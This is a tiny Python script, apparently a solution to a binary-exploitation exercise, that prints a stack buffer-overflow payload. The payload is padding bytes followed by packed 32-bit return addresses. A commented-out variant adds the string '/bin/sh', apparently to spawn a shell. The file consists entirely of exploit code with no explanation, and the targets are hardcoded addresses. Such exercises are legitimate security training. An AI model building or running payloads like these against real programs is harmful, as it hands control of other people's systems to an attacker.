from shellcode import shellcode
from struct import pack

# bin/sh + beginning of buffer +
# print(pack("<I", 0xbffea6c6) + pack("<I", 0x08048eed) + "/bin/sh" + "\xaa"*3 + pack("<I", 0xbffea6c6) + pack("<I", 0x08048f0c))
print("\xaa"*22 + pack("<I", 0x0804a030) + "\xaa"*4 + pack("<I", 0x080c61e5))
